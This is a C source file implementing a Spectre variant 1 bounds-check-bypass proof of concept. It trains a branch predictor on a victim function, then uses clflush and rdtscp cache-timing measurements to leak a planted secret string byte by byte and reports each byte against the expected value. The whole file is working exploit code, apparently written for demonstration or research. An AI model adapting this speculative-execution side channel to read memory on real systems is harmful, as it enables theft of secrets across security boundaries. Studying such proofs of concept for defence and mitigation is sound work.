#include <stdint.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#define CACHE_LINE_SPACING 512
#define ARRAY2_SIZE (256 * CACHE_LINE_SPACING)

volatile unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[ARRAY2_SIZE];

const char *secret = "The Magic Words are Squeamish Ossifrage.";

volatile uint8_t temp = 0;

static inline void flush_and_wait(const volatile void *p)
{
    _mm_clflush((const void *)p);
    _mm_mfence();
}

__attribute__((noinline))
void victim_function(size_t x)
{
    if (x < array1_size) 
    {
        temp ^= array2[array1[x] * CACHE_LINE_SPACING];
    }
}

static int cmp_u64(const void *a, const void *b)
{
    uint64_t x = *(const uint64_t *)a;
    uint64_t y = *(const uint64_t *)b;

    if (x < y) return -1;
    if (x > y) return 1;
    return 0;
}

static inline uint64_t measure_access_time(volatile uint8_t *addr)
{
    unsigned int aux;
    uint64_t start;
    uint64_t elapsed;
    volatile uint8_t junk;

    _mm_lfence();
    start = __rdtscp(&aux);
    junk = *addr;
    _mm_lfence();
    elapsed = __rdtscp(&aux) - start;
    _mm_lfence();

    temp ^= junk;

    return elapsed;
}

int calibrate_threshold(void)
{
    enum { SAMPLES = 10000 };

    uint64_t cached_times[SAMPLES];
    uint64_t flushed_times[SAMPLES];

    volatile uint8_t *addr = &array2[128 * CACHE_LINE_SPACING];

    for (size_t i = 0; i < sizeof(array2); i++) 
    {
        array2[i] = 1;
    }

    for (int i = 0; i < SAMPLES; i++) 
    {
        temp ^= *addr;
        _mm_mfence();
        cached_times[i] = measure_access_time(addr);
    }

    for (int i = 0; i < SAMPLES; i++) 
    {
        flush_and_wait(addr);
        flushed_times[i] = measure_access_time(addr);
    }

    qsort(cached_times, SAMPLES, sizeof(uint64_t), cmp_u64);
    qsort(flushed_times, SAMPLES, sizeof(uint64_t), cmp_u64);

    uint64_t cached_median = cached_times[SAMPLES / 2];
    uint64_t flushed_median = flushed_times[SAMPLES / 2];

    /*
     * Do not use the exact midpoint if it is too high.
     * A lower threshold often reduces false cache hits.
     */
    int threshold =
        (int)(cached_median + (flushed_median - cached_median) / 3);

    printf("Calibration result:\n");
    printf("  cached median  = %" PRIu64 " cycles\n", cached_median);
    printf("  flushed median = %" PRIu64 " cycles\n", flushed_median);
    printf("  threshold      = %d cycles\n", threshold);

    return threshold;
}

void attack(size_t malicious_x, uint8_t value[2], int score[2], int threshold)
{
    const int NUM_TRIES = 10000;

    int hit_counts[256] = {0};

    unsigned int aux = 0;
    uint64_t time1;
    uint64_t time2;

    volatile uint8_t *addr;
    volatile uint8_t junk = 0;

    int best = -1;
    int second = -1;

    for (int rep = NUM_TRIES; rep > 0; rep--) 
    {
        size_t training_x = rep % array1_size;

        /*
         * Step 1: Flush array2.
         */
        for (int i = 0; i < 256; i++) 
        {
            _mm_clflush(&array2[i * CACHE_LINE_SPACING]);
        }
        _mm_mfence();

        /*
         * Step 2: 5 normal calls + 1 malicious call.
         *
         * j = 5,4,3,2,1 -> training_x
         * j = 0           -> malicious_x
         *
         * This is the classic Spectre pattern.
         */
        for (int j = 5; j >= 0; j--) 
        {
            // Flush array1_size so that evaluating x < array1_size becomes slow.
            flush_and_wait(&array1_size);

            for (volatile int z = 0; z < 100; z++) 
            {
            }

            /*
             * Branchless selection:
             *
             * when j == 0, use malicious_x
             * otherwise, use training_x
             *
             * This avoids adding an extra branch that may disturb the
             * branch predictor behavior.
             */
            size_t x;
            size_t mask;

            mask = ((j % 6) - 1) & ~0xFFFF;
            mask = mask | (mask >> 16);

            x = training_x ^ (mask & (malicious_x ^ training_x));

            victim_function(x);
        }

        /*
         * Step 3: Measure array2 in shuffled order. The access order is shuffled to reduce hardware prefetcher noise.
         */
        for (int i = 0; i < 256; i++) 
        {
            int mix_i = ((i * 167) + 13) & 255;

            addr = &array2[mix_i * CACHE_LINE_SPACING];

            _mm_lfence();
            time1 = __rdtscp(&aux);
            junk ^= *addr;
            _mm_lfence();
            time2 = __rdtscp(&aux) - time1;
            _mm_lfence();

            /*
             * Ignore the training value, because the five legal training
             * calls also cache array2[array1[training_x] * 512].
             */
            if (time2 <= (uint64_t)threshold &&
                mix_i != array1[training_x]) 
            {
                hit_counts[mix_i]++;
            }
        }
    }

    /*
    * Step 4: Find the top two candidates.
    */
    for (int i = 0; i < 256; i++) 
    {
        if (best < 0 || hit_counts[i] >= hit_counts[best])
        {
            second = best;
            best = i;
        } else if (second < 0 || hit_counts[i] >= hit_counts[second]) 
        {
            second = i;
        }
    }

    // Use junk to avoid optimization
    temp ^= junk;

    // Report the results
    value[0] = (uint8_t)best;
    value[1] = (uint8_t)second;
    score[0] = hit_counts[best];
    score[1] = hit_counts[second];
}

int main(int argc, char **argv)
{
    int secret_len = (int)strlen(secret);

    if (16 + secret_len >= (int)sizeof(array1)) 
    {
        fprintf(stderr, "Secret is too long for array1.\n");
        return 1;
    }

    memcpy(&array1[16], secret, secret_len);

    for (size_t i = 0; i < sizeof(array2); i++) 
    {
        array2[i] = 1;
    }

    size_t malicious_x = 16;

    int threshold;

    if (argc >= 2) 
    {
        threshold = atoi(argv[1]);
        printf("Using manual threshold = %d\n\n", threshold);
    } 
    else 
    {
        threshold = calibrate_threshold();
        printf("\nUsing calibrated threshold = %d\n\n", threshold);
    }

    int score[2];
    uint8_t value[2];

    int correct_confident_count = 0;

    printf("Reading %d bytes:\n", secret_len);

    for (int idx = 0; idx < secret_len; idx++) 
    {
        printf("Reading byte %d... ", idx);

        attack(malicious_x++, value, score, threshold);

        int confident =
            (score[0] >= 5 && score[0] >= 2 * score[1]);

        int correct =
            (value[0] == (uint8_t)secret[idx]);

        printf("%s/%s: ",
               confident ? "Confident" : "Unclear",
               correct ? "Correct" : "Wrong");

        printf("0x%02X='%c' score=%d ",
               value[0],
               (value[0] > 31 && value[0] < 127) ? value[0] : '?',
               score[0]);

        if (score[1] > 0) 
        {
            printf("(second best: 0x%02X='%c' score=%d) ",
                   value[1],
                   (value[1] > 31 && value[1] < 127) ? value[1] : '?',
                   score[1]);
        }

        printf("expected=0x%02X='%c'",
               (uint8_t)secret[idx],
               (secret[idx] > 31 && secret[idx] < 127) ? secret[idx] : '?');

        printf("\n");

        if (confident && correct) 
        {
            correct_confident_count++;
        }
    }

    printf("\nCorrect confident count: %d / %d\n",
           correct_confident_count,
           secret_len);

    return 0;
}
